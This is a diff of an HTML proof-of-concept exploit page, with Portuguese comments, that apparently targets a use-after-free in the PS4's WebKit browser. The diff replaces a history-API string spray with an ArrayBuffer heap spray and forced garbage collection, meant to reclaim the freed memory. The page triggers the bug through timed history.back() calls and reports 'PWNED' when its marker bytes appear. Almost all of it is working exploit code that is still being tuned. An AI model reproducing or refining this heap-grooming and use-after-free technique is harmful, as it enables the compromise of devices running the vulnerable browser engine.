@@ -2,34 +2,30 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit - Native History Spray</title>
+<title>PS4 WebKit - Buffer + GC Strategy</title>
 <style>
-    body { background-color: #000; color: #fff; font-family: monospace; padding: 20px; }
+    body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; }
     button { 
         padding: 20px; width: 100%; margin-bottom: 10px;
         font-weight: bold; font-size: 16px; cursor: pointer; 
-        border: 2px solid #fff; background: #333; color: #fff;
+        border: 2px solid #0f0; background: #003300; color: #fff;
         text-transform: uppercase;
     }
-    .btn-8 { border-color: #0f0; color: #0f0; }
-    .btn-16 { border-color: #f0f; color: #f0f; }
     #log { border: 1px solid #555; margin-top: 20px; padding: 10px; white-space: pre-wrap; height: 350px; overflow-y: scroll;}
 </style>
 </head>
 <body>
-<h2>PS4 WebKit - Native History Reclaim</h2>
-<div id="status">Aguardando...</div>
+<h2>PS4 WebKit - Buffer Spray + GC (Non-Blocking)</h2>
+<div id="status">Pronto.</div>
 
-<button class="btn-8" onclick="runHistorySpray(340356)">MODO 1: 8-BIT (~340KB Chars)</button>
-
-<button class="btn-16" onclick="runHistorySpray(170178)">MODO 2: 16-BIT (~170KB Chars)</button>
+<button onclick="runStableExploit()">INICIAR RECLAIM (ESTÁVEL)</button>
 
 <div id="log"></div>
 
 <script>
 const logEl = document.getElementById("log");
 const statusEl = document.getElementById("status");
-function log(m, type="") { 
+function log(m) { 
     const d = document.createElement("div");
     d.textContent = m;
     logEl.appendChild(d);
@@ -37,24 +33,25 @@ function log(m, type="") {
 }
 function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
-async function runHistorySpray(targetChars) {
-    logEl.innerHTML = "";
-    statusEl.innerText = "Preparando...";
+var keepAlive = [];
 
-    // 1. GERAÇÃO DE PAYLOADS
-    // Vamos gerar variações ao redor do tamanho alvo para compensar headers.
-    // Usamos history.replaceState, então precisamos de strings reais.
-    log(`1. Gerando payloads ao redor de ${targetChars} chars...`);
-    
-    let payloads = [];
-    // Variação generosa de +/- 128 bytes
-    for(let delta = -128; delta <= 128; delta += 4) {
-        let len = targetChars + delta;
-        // Prefixo 'W' para ser visível
-        payloads.push("W".repeat(len));
+// TÉCNICA DO PSFREE.MJS: Função de Garbage Collection
+// Isso é essencial para limpar a memória "suja" e permitir a realocação
+function forceGC() {
+    for (let i = 0; i < 2; i++) {
+        // Aloca 4MB temporários para forçar o WebKit a limpar o lixo
+        new Uint8Array(4 * 1024 * 1024);
     }
+}
+
+async function runStableExploit() {
+    logEl.innerHTML = "";
+    keepAlive = []; 
+    statusEl.innerText = "Rodando...";
+
+    const TARGET_SIZE = 340356;
     
-    // 2. TRIGGER UAF
+    log(`1. Alvo fixado: ${TARGET_SIZE} bytes.`);
     log("2. Disparando UAF...");
     
     let size = 977;
@@ -67,27 +64,49 @@ async function runHistorySpray(targetChars) {
         
         if(i % 6 === 0) setTimeout(() => history.back(), 0);
         
-        // NA JANELA CRÍTICA:
+        // MOMENTO CRÍTICO
         if (i === 47) {
-            log(">>> INJETANDO VIA HISTORY API <<<");
-            // Spray Síncrono usando a própria API do histórico
-            // Isso deve usar o mesmo alocador (IsoHeap)
-            for(let p of payloads) {
-                // replaceState aloca uma nova string de URL e libera a antiga.
-                // Estamos tentando fazer uma dessas novas cair no buraco da antiga.
-                // O terceiro argumento é a URL.
-                history.replaceState({}, "", "#" + p);
-            }
+            log(">>> SPRAY RÁPIDO + GC <<<");
+            
+            // 1. Agenda o back() que vai liberar a memória 'V'
+            setTimeout(() => history.back(), 0);
+            
+            // 2. IMEDIATAMENTE enche a memória com ArrayBuffers
+            // Não usamos loop pesado aqui para não travar a thread
+            doQuickSpray(TARGET_SIZE);
+            
+            // 3. Força o GC para garantir que o 'V' suma e o Buffer entre
+            // Isso pode causar uma leve travada, mas é necessária
+            setTimeout(() => forceGC(), 10); 
         } else {
             size += STEP;
             await sleep(5);
         }
     }
     
-    await sleep(200);
+    // Dá um tempo para o GC rodar e a memória assentar
+    await sleep(300);
 
-    // 3. VERIFICAÇÃO
+    // === VERIFICAÇÃO ===
     checkResult();
+}
+
+function doQuickSpray(size) {
+    // Cria 200 buffers de tamanho exato + variações
+    // ArrayBuffer é alocado nativamente (rápido, não trava a UI)
+    const VARIATIONS = [-32, -16, 0, 16, 32]; // Ajuste fino de header
+    
+    for(let k=0; k<50; k++) { // 50 lotes
+        for(let v of VARIATIONS) {
+            try {
+                let buf = new ArrayBuffer(size + v);
+                let view = new Uint8Array(buf);
+                // Marca o início com 'A' (0x41)
+                view[0] = 0x41; view[1] = 0x41; view[2] = 0x41; view[3] = 0x41;
+                keepAlive.push(buf);
+            } catch(e) {}
+        }
+    }
 }
 
 function checkResult() {
@@ -96,26 +115,25 @@ function checkResult() {
     let changed = false;
     let sample = "";
     
-    // Procura por 'W'
+    // Procura por 'A' (0x41)
     for(let i=1000; i<5000; i++) {
-        if(url.charCodeAt(i) === 0x57) { // 0x57 é 'W'
+        if(url.charCodeAt(i) === 0x41) { 
             changed = true;
-            sample = "Encontrado 'W' no offset " + i;
+            sample = "Encontrado 'AAAA' no offset " + i;
             break;
         }
     }
 
     if(changed) {
-        log("!!! JACKPOT !!!", "success");
-        log("Native History Spray funcionou!");
+        log("!!! JACKPOT !!!");
+        log("Memória Reclamada com Sucesso!");
         log(sample);
         statusEl.innerText = "PWNED";
-        statusEl.style.backgroundColor = "#fff";
+        statusEl.style.backgroundColor = "#0f0";
         statusEl.style.color = "#000";
     } else {
         log("Falha: Ainda vendo 'V'.");
-        log("URL Length Atual: " + url.length);
-        log("Nota: Se falhar, o IsoHeap pode estar usando 'Slabs' que não reutilizam imediatamente.");
+        log("O GC rodou, mas o buraco ainda está protegido.");
     }
 }
 </script>
